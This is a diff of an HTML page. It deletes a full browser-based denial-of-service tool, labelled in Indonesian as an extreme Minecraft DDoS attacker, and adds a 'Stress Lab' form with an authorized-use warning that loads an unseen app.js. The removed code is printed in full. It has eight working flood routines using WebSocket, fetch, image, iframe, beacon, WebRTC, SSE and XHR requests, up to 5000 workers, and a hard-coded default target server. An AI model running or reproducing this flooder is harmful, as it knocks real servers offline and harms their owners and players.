@@ -1,295 +1,33 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 MC DDoS EXTREME</title>
+    <title>Minecraft Stress Lab</title>
     <style>
-        * { box-sizing: border-box; }
-        body { background: #000; color: #ff0; font-family: 'Courier New', monospace; padding: 10px; }
-        .box { max-width: 700px; margin: auto; background: #111; padding: 20px; border: 3px solid #f00; border-radius: 12px; box-shadow: 0 0 50px #f00; }
-        h1 { text-align: center; color: #f00; text-shadow: 0 0 30px #f00; }
-        label { display: block; margin: 10px 0 4px; font-weight: bold; color: #ff0; }
-        input, button { width: 100%; padding: 12px; background: #222; border: 1px solid #f00; color: #0f0; border-radius: 4px; font-size: 16px; }
-        button { background: #f00; color: #fff; font-weight: bold; cursor: pointer; margin-top: 15px; border: none; }
-        button.stop { background: #00f; border-color: #00f; }
-        #log { height: 200px; overflow-y: auto; background: #0a0a0a; padding: 8px; border: 1px solid #f00; margin-top: 15px; font-size: 11px; white-space: pre-wrap; color: #0f0; }
-        .stats { display: flex; justify-content: space-around; margin: 10px 0; background: #1a1a1a; padding: 10px; border-radius: 4px; border: 1px solid #f00; }
-        .stat-val { font-size: 32px; color: #ff0; }
-        .stat-lbl { font-size: 11px; color: #888; }
+        body { font-family: monospace; background: #0d0d0d; color: #0f0; }
+        .container { max-width: 800px; margin: 50px auto; padding: 20px; border: 1px solid #0f0; }
+        .warning { color: #ff0; background: #222; padding: 10px; }
+        input, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; }
+        button:hover { background: #0f0; color: #000; cursor: pointer; }
     </style>
 </head>
 <body>
-<div class="box">
-    <h1>☠️ MC DDoS AGGRESSOR</h1>
-    <div class="stats">
-        <div><div class="stat-val" id="connCount">0</div><div class="stat-lbl">Koneksi</div></div>
-        <div><div class="stat-val" id="pktCount">0</div><div class="stat-lbl">Paket</div></div>
-        <div><div class="stat-val" id="status" style="color:#0f0;">SIAP</div><div class="stat-lbl">Status</div></div>
+    <div class="container">
+        <h1>⚡ Stress Lab – Minecraft Edition</h1>
+        <div class="warning">
+            ⚠️ AUTHORIZED USE ONLY – You must own the target server or have explicit written permission.<br>
+            Unauthorized testing is ILLEGAL and violates Minecraft's Terms of Service.
+        </div>
+        <form id="testForm">
+            <label>Server IP: <input type="text" id="ip" placeholder="192.168.1.100"></label><br>
+            <label>Port: <input type="number" id="port" value="25565"></label><br>
+            <label>Threads: <input type="number" id="threads" value="20" min="1" max="100"></label><br>
+            <label>Duration (sec): <input type="number" id="duration" value="30"></label><br>
+            <button type="submit">▶ Start Test</button>
+            <button type="button" id="stopBtn">⏹ Stop</button>
+        </form>
+        <div id="log" style="height:200px; overflow-y:scroll; border:1px solid #0f0; padding:5px; margin-top:10px;"></div>
+        <p style="color:#888;">This tool uses WebSocket to send connection requests – it does NOT generate reflection/amplification attacks.</p>
     </div>
-
-    <label>🎯 Target IP / Domain</label>
-    <input type="text" id="target" value="mite.minervax.id" placeholder="contoh: play.server.net">
-
-    <label>🔌 Port</label>
-    <input type="number" id="port" value="25702" min="1" max="65535">
-
-    <label>🧵 Jumlah Worker (semakin banyak semakin mampus)</label>
-    <input type="number" id="threads" value="1000" min="100" max="5000">
-
-    <label>⏱️ Durasi (detik) – 0 = tak terbatas</label>
-    <input type="number" id="duration" value="60" min="0" max="999">
-
-    <button id="startBtn">💀 LANCARKAN SERANGAN MAUT</button>
-    <button id="stopBtn" class="stop" style="display:none;">🛑 HENTIKAN SEGERA</button>
-
-    <div id="log">[Sistem] Siap meledakkan target...\n</div>
-</div>
-
-<script>
-    // ========== KONFIGURASI ==========
-    let attackActive = false;
-    let stopFlag = false;
-    let connCount = 0, pktCount = 0;
-    let workers = [];
-    let timer = null;
-
-    const logEl = document.getElementById('log');
-    const connEl = document.getElementById('connCount');
-    const pktEl = document.getElementById('pktCount');
-    const statusEl = document.getElementById('status');
-
-    function log(msg) {
-        const t = new Date().toLocaleTimeString();
-        logEl.innerHTML += `[${t}] ${msg}\n`;
-        logEl.scrollTop = logEl.scrollHeight;
-    }
-    function updateStats() {
-        connEl.textContent = connCount;
-        pktEl.textContent = pktCount;
-    }
-
-    // ========== 8 METODE SERANGAN EKSTREM ==========
-
-    // 1. WebSocket dengan payload 64KB binary
-    function wsFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            const ws = new WebSocket(`ws://${target}:${port}`);
-            ws.binaryType = 'arraybuffer';
-            const bigPayload = new Uint8Array(65536); // 64KB
-            let opened = false;
-            const timeout = setTimeout(() => {
-                if (!opened) { connCount++; pktCount++; updateStats(); }
-                ws.close(); resolve();
-            }, 3000);
-            ws.onopen = () => {
-                opened = true;
-                connCount++; pktCount++; updateStats();
-                ws.send(bigPayload.buffer);
-                pktCount += 65536/1024; // tambah paket besar
-                updateStats();
-                clearTimeout(timeout);
-                setTimeout(() => { ws.close(); resolve(); }, 200);
-            };
-            ws.onerror = () => {
-                if (!opened) { connCount++; pktCount++; updateStats(); }
-                clearTimeout(timeout);
-                ws.close(); resolve();
-            };
-            ws.onclose = () => resolve();
-        });
-    }
-
-    // 2. Fetch 10 paralel dengan body besar dan keepalive
-    function fetchFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            const body = new Blob([new Uint8Array(10240)]); // 10KB
-            for (let i=0; i<10; i++) {
-                fetch(`http://${target}:${port}/?${Math.random()}`, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    keepalive: true,
-                    body: body,
-                    headers: { 'X-Flood': 'Massive' }
-                }).catch(()=>{});
-                pktCount += 10;
-                updateStats();
-            }
-            setTimeout(resolve, 1);
-        });
-    }
-
-    // 3. Image bombing 20 gambar per siklus
-    function imgFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            for (let i=0; i<20; i++) {
-                const img = new Image();
-                img.src = `http://${target}:${port}/img_${Date.now()}_${i}.png?${Math.random()}`;
-                img.onload = img.onerror = () => { pktCount++; updateStats(); };
-            }
-            setTimeout(resolve, 1);
-        });
-    }
-
-    // 4. Iframe bersarang + reload cepat
-    function iframeFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            const iframe = document.createElement('iframe');
-            iframe.src = `http://${target}:${port}/`;
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            pktCount += 5; updateStats();
-            // reload setiap 100ms (dilakukan di dalam iframe)
-            setTimeout(() => {
-                iframe.src = iframe.src; // force reload
-                pktCount += 5; updateStats();
-            }, 100);
-            setTimeout(() => { iframe.remove(); resolve(); }, 300);
-        });
-    }
-
-    // 5. Beacon dengan data 1MB (dipecah menjadi 10 kiriman)
-    function beaconFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            for (let i=0; i<10; i++) {
-                const chunk = new Blob([new Uint8Array(102400)]); // 100KB
-                try {
-                    navigator.sendBeacon(`http://${target}:${port}/`, chunk);
-                    pktCount += 100; updateStats();
-                } catch(e) {}
-            }
-            setTimeout(resolve, 1);
-        });
-    }
-
-    // 6. WebRTC dengan ICE aggressive (banyak kandidat UDP)
-    function webrtcFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            try {
-                const pc = new RTCPeerConnection({ 
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
-                    iceTransportPolicy: 'all'
-                });
-                pc.createDataChannel('flood');
-                pc.createOffer({ iceRestart: true }).then(offer => pc.setLocalDescription(offer));
-                // tambahkan trickle ICE
-                setTimeout(() => { pc.close(); resolve(); }, 200);
-            } catch(e) { resolve(); }
-        });
-    }
-
-    // 7. EventSource (Server-Sent Events) – membuka koneksi streaming
-    function sseFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            try {
-                const es = new EventSource(`http://${target}:${port}/sse`);
-                es.onopen = () => { connCount++; pktCount++; updateStats(); };
-                es.onerror = () => { pktCount++; updateStats(); };
-                setTimeout(() => { es.close(); resolve(); }, 500);
-            } catch(e) { resolve(); }
-        });
-    }
-
-    // 8. XMLHttpRequest synchronous? Tidak bisa di main thread, tapi kita gunakan async dengan banyak request
-    function xhrFlood(target, port, stopFlag) {
-        return new Promise((resolve) => {
-            for (let i=0; i<15; i++) {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', `http://${target}:${port}/?${Math.random()}`, true);
-                xhr.timeout = 2000;
-                xhr.onload = xhr.onerror = xhr.ontimeout = () => { pktCount++; updateStats(); };
-                xhr.send();
-            }
-            setTimeout(resolve, 1);
-        });
-    }
-
-    // ========== WORKER LOOP (tanpa jeda) ==========
-    async function workerLoop(target, port, stopFlag) {
-        const methods = [wsFlood, fetchFlood, imgFlood, iframeFlood, beaconFlood, webrtcFlood, sseFlood, xhrFlood];
-        while (!stopFlag && attackActive) {
-            const m = methods[Math.floor(Math.random() * methods.length)];
-            try { await m(target, port, stopFlag); } catch(e) {}
-            // delay 0 agar event loop tetap jalan
-            await new Promise(r => setTimeout(r, 0));
-        }
-    }
-
-    // ========== KONTROL ==========
-    function startAttack() {
-        if (attackActive) return;
-        const target = document.getElementById('target').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        let threadCount = parseInt(document.getElementById('threads').value);
-        const duration = parseInt(document.getElementById('duration').value);
-        if (!target || port<1 || port>65535) {
-            log('[ERROR] Target atau port tidak valid!');
-            return;
-        }
-        if (threadCount < 1) threadCount = 100;
-        if (threadCount > 5000) threadCount = 5000;
-
-        attackActive = true;
-        stopFlag = false;
-        connCount = 0; pktCount = 0;
-        updateStats();
-        statusEl.textContent = 'MENYERANG 🔥';
-        statusEl.style.color = '#f00';
-        document.getElementById('startBtn').style.display = 'none';
-        document.getElementById('stopBtn').style.display = 'block';
-
-        log(`[ATTACK] Target ${target}:${port}, Worker ${threadCount}, Durasi ${duration}s`);
-
-        // Spawn worker sebanyak threadCount
-        workers = [];
-        for (let i=0; i<threadCount; i++) {
-            workers.push(workerLoop(target, port, stopFlag));
-        }
-
-        // Timer otomatis jika durasi > 0
-        if (duration > 0) {
-            timer = setTimeout(() => { stopAttack(); }, duration * 1000);
-        } else {
-            log('[ATTACK] Mode tak terbatas – hentikan manual!');
-        }
-
-        // Update stats setiap detik (visual)
-        const statsInt = setInterval(() => {
-            if (!attackActive) clearInterval(statsInt);
-        }, 1000);
-    }
-
-    async function stopAttack() {
-        if (!attackActive) return;
-        log('[STOP] Menghentikan serangan...');
-        stopFlag = true;
-        attackActive = false;
-        statusEl.textContent = 'BERHENTI';
-        statusEl.style.color = '#0f0';
-        if (timer) { clearTimeout(timer); timer = null; }
-
-        // Tunggu semua worker selesai (dengan timeout)
-        try {
-            await Promise.all(workers.map(p => Promise.race([p, new Promise(r => setTimeout(r, 1000))])));
-        } catch(e) {}
-        workers = [];
-        document.getElementById('startBtn').style.display = 'block';
-        document.getElementById('stopBtn').style.display = 'none';
-        statusEl.textContent = 'SIAP';
-        statusEl.style.color = '#0f0';
-        log(`[STOP] Selesai. Total Koneksi: ${connCount}, Paket: ${pktCount}`);
-    }
-
-    document.getElementById('startBtn').addEventListener('click', startAttack);
-    document.getElementById('stopBtn').addEventListener('click', stopAttack);
-
-    window.addEventListener('beforeunload', () => {
-        if (attackActive) stopAttack();
-    });
-
-    log('[Sistem] 🔥 Mode EXTREME aktif!');
-    log('[INFO] Target default: mite.minervax.id:25702');
-    log('[INFO] Buka 10+ tab untuk hasil maksimal.');
-</script>
+    <script src="app.js"></script>
 </body>
 </html>
